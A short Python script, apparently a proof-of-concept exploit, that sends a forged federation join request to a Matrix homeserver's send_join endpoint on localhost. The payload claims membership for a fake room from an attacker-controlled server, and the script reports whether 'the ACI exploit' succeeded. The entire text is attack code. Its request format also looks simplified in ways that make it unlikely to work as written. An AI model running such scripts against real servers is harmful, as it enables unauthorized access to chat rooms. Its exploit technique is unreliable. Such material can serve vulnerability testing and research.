import requests

# Define the target URL and the malicious payload
target_url = "http://localhost:8008/_matrix/federation/v1/send_join"
malicious_payload = {
    "room_id": "!fakeRoom:example.com",
    "event_id": "$maliciousEvent:attacker.com",
    "user_id": "@attacker:attacker.com",
    "content": {
        "membership": "join"
    }
}

# Send the malicious request
response = requests.put(target_url, json=malicious_payload)

# Check if the exploit is successful based on the response
if response.status_code == 200:
    print("The ACI exploit success!!!")
else:
    print("The ACI exploit failed!!!")
